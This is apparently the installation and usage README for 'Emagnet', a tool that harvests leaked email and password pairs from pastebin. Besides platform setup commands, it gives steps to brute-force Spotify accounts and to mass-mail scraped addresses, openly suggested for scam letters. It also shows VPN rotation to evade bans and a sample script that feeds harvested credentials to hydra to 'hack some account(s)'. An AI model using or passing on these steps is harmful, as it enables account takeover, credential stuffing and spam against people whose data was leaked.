# Installation

## Install Emagnet on Windows 10

      1) Install Ubuntu or any other distro from Microsoft Store
      2) When installation has been done, hit 'start'
      3) Now type 'sudo -s' and enter your password
      4) Now update repo and install git, just copy and paste the below lines

      apt update; apt install git -y; git clone https://github.com/wuseman/emagnet
      cd emagnet;chmod +x ./emagnet; ./emagnet --emagnet

See video here. https://nr1.nu/emagnet/pictures/emagnet-on-windows.gif

 _*Notice about video:*_ ---> You don't need run emagnet-setup anymore, just run emagnet as it is and you're done!
## Get started on Linux;

##### You can copy and paste below code in your shell 

    git clone https://github.com/wuseman/EMAGNET
    cd EMAGNET;bash emagnet --emagnet

## GET STARTED ON MACOSX

##### You can copy and paste below code in your shell 

    export NUMCPUS=$(nproc)
    export NUMCPUSPLUSONE=$(( NUMCPUS + 1 ))
    export MAKEOPTS="-j${NUMCPUSPLUSONE} -l${NUMCPUS}"
    wget -P /tmp http://ftp.gnu.org/gnu/sed/sed-4.8.tar.gz
    cd /tmp && tar -xf sed-4.8.tar.gz
    cd sed-4.8
     ./configure --prefix=/usr/ --program-suffix=-gnu
    make --jobs=${NUMCPUSPLUSONE} --load-average=${NUMCPUS}
    make install
    mv /usr/bin/sed /usr/bin/sed-bsd
    mv /usr/bin/sed /usr/bin/sed-bsd
    ln -s /usr/bin/sed-gnu /usr/bin/sed
    git clone https://github.com/wuseman/EMAGNET
    cd EMAGNET;bash emagnet --emagnet

## GET STARTED ON ANDROID:

[Click here for see a tutorial video how-to get started on android](https://nr1.nu/emagnet/pictures/android-emagnet.gif)

    echo -e '
    pkg update
    pkg upgrade -y
    pkg install wget curl git -y
    git clone https://github.com/wuseman/emagnet

     cd emagnet
     bash emagnet --emagnet' > emagnet-termux.sh
     bash emagnet-termux.sh


## Getting started with emagnet 'spam' - (It's not a spamming feature - Just baptized it that way)

> Uhm, so why is this added to a brute tool and who is it for then?

* If you run a business and want to get your spam out to people fast and easy.
* If you're an idiot that spreading nigeria letters, you can use this feature for spreading your shit
* If you just want to get your commercial out to new people

### How to get started: 

* You must install ssmtp before you can use this. 

#### Gentoo

    emerge --ask ssmtp

#### Debian/Ubuntu/Kali/Mint and other apt distros:

    apt install ssmtp

Once installed, edit the values for your setup and copy and paste into a terminal and that's it!

#### Let me show you an example for gmail:

    cat < "EOF" > /etc/ssmtp/ssmtp.conf
      user="Wuzeman Emagnetzon"
      mailhub=smtp.gmail.com:587
      rewriteDomain=gmail.com
      # hostname=yourlocalhost.yourlocaldomain.tld
      TLS_CA_FILE=/etc/pki/tls/certs/ca-bundle.crt
      UseTLS=Yes
      UseSTARTTLS=Yes
      AuthUser=your_email@gmail.com
      AuthPass=<password>
      AuthMethod=LOGIN
      FromLineOverride=yes
    EOF
    
Now run emagnet until you have some email addresses:

      ./emagnet -e

And then, just run: 

      ./emagnet -s

You will now see how many email addresses you will send your email to, if you say yes then you going to send your email. So simple! 

           _                      _______                      _
        _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
       dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
       V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
                `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
                 `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
            __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
          ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
       _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._
                   `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
           ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
         ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
        ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
        MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
        YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
         `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
           `'                  `OObNNNNNdOO'                   `'
                                 `~OOOOO~'
      
      =================================================================

                               Targets: 8

      - Do you want to send an email to all targets (yes/NO): yes

      ===============================================================
      [+] Sending email to email1@gmail.com....................[.ok.]
      [+] Sending email to email2@gmail.com....................[.ok.]
      [+] Sending email to email3@gmail.com....................[.ok.]
      [+] Sending email to email4@gmail.com....................[.ok.]
      [+] Sending email to email5@gmail.com....................[.ok.]
      [+] Sending email to email6@gmail.com....................[.ok.]
      [+] Sending email to email7@gmail.com....................[.ok.]
      [+] Sending email to email8@gmail.com....................[.ok.]
      ........... and so on


## How to get started with brute forcer for spotify:

#### On GNU/Linux Gentoo wich is the supported distro for emagnet, just do as following:

      emerge --ask eselect-repository
      eselect repository enable palmer
      eix-sync;eix-update
      emerge --ask =dev-libs/libspotify-12.1.51
      emerge --ask media-libs/portaudio

* Now you are ready to brute force spotify accounts:

      bash emagnet --bruteforce spotify

####  On Ubuntu/Kali/Debian:

      wget -q -O - https://apt.mopidy.com/mopidy.gpg | sudo apt-key add -
      wget -q -O /etc/apt/sources.list.d/mopidy.list https://apt.mopidy.com/stretch.list
      sudo apt-get update
      sudo apt-get install libspotify12 libspotify-dev libportaudio

* Now you are ready to brute force spotify accounts:

      bash emagnet --bruteforce spotify

# How to get VPN running with emagnet..

* Create a folder in /etc/openvpn with your providers name, for example hidemyass:

       mkdir -p /etc/openvpn/hidemyass

* Download the configuration files from the providers homepage and unzip them in above folder. 

*  And here is a overview how it should look alike to have vpn working (don't forget to set provider and vpn to true)

       CountryCode               Name Your Files As Below For Get VPN Running:
       ........................................................................
       be = belgium              /etc/openvpn/vpnprovider/vpnprovider.be.ovpn
       bg = bulgaria             /etc/openvpn/vpnprovider/vpnprovider.bg.ovpn
       cz = czech republic       /etc/openvpn/vpnprovider/vpnprovider.cz.ovpn
       dk = denmark              /etc/openvpn/vpnprovider/vpnprovider.dk.ovpn
       es = spain                /etc/openvpn/vpnprovider/vpnprovider.es.ovpn
       fi = finland              /etc/openvpn/vpnprovider/vpnprovider.fi.ovpn
       gb = great britain        /etc/openvpn/vpnprovider/vpnprovider.gb.ovpn
       gr = greece               /etc/openvpn/vpnprovider/vpnprovider.gr.ovpn
       hk = hong-kong (.ch)      /etc/openvpn/vpnprovider/vpnprovider.hk.ovpn
       hu = hungary              /etc/openvpn/vpnprovider/vpnprovider.hu.ovpn
       it = italy                /etc/openvpn/vpnprovider/vpnprovider.it.ovpn
       md = moldavia             /etc/openvpn/vpnprovider/vpnprovider.md.ovpn
       nl = netherlands          /etc/openvpn/vpnprovider/vpnprovider.nl.ovpn
       no = norway               /etc/openvpn/vpnprovider/vpnprovider.no.ovpn
       pl = poland               /etc/openvpn/vpnprovider/vpnprovider.pl.ovpn 
       pt = portugal             /etc/openvpn/vpnprovider/vpnprovider.pt.ovpn
       ro = romania              /etc/openvpn/vpnprovider/vpnprovider.ro.ovpn
       se = sweden config nr 1   /etc/openvpn/vpnprovider/vpnprovider.se.ovpn
       se2 = sweden config nr 2  /etc/openvpn/vpnprovider/vpnprovider.se2.ovpn
       se3 = sweden config nr 3  /etc/openvpn/vpnprovider/vpnprovider.se3.ovpn
       se4 = sweden config nr 4  /etc/openvpn/vpnprovider/vpnprovider.se4.ovpn
       us = united states        /etc/openvpn/vpnprovider/vpnprovider.us.ovpn

* And of course, if this is a new setup then don't forget to add your login file if necessary: 

      for files in ./etc/openvpn/proivder/*; do sed -i 's/auth-user-pass/auth-user-pass login.txt/g' "${files}"; done


See VPNCOUNTRYS in emagnet.conf for what countries is available as default and how emagnet reading the files. 
You can of course edit the countrys to anything else but feel free to get it working on your own then.

If you have two providers or even three as I do, just do exactly as above then but edit VPNPROVIDER2 and 3 for your other provider and same with countries name them after VPNCOUNTRYS2 and 3. Now you can scrape pastebin every second if you want since you will change ip asap you have been banned but please don't do that. Use it with common sense.

# A quick sample script for getting started with a script running beside emagnet: 
##### Mod it after your needs:

    cat > my-bruteforce-tool.sh <<EOF
 
    #!/bin/bash                               
    # inotify-tools is required for this sample
    
    # Where emagnet.conf is stored so you can read folders
    . /path/to/emagnet.conf                          

    # Where to place email + passwords we have found wich will be our target
    HYDRA_TARGETS="/tmp/.emagnet-hydra-targets.txt"          

    # When something happens in emagnet's temp folder  
    # then search for email+password combos and if something is found
    # then your command will be triggered and attack the targets.
    while inotifywait -e modify "${EMAGNETTEMP}"; do
    PASTEBIN_TARGETS=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "${EMAGNETTEMP}"|awk '{print $1}'| \
         cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v '/' > "${HYDRA_TARGETS}")

        # If the target file is empty, then we monitor the dir again
        # until emagnet download new files otherwise use the prefered tool and attack your targets 
          if [[ -s "${HYDRA_TARGETS}" ]]; then
             <add your hydra or prefered tool here>
          fi
     done
    EOF
 
#### Change permissions so you are allowed to execute your script:
    chmod +x my-bruteforce-tool.sh

#### Now run your script by:
    ./my-bruteforce-tool.sh

#### And at same time in another window start emagnet by.
    
    ./emagnet --emagnet

#### Now go spend your time on sensible things, let this setup be up and running for a while and I can guarantee that you have managed to hack some account(s) if there is no problems with your own script. . Now you're a hacker!

##### Before every successful Coder there an even more successful De-coder to understand that code, the easier it is, the better it is. ;)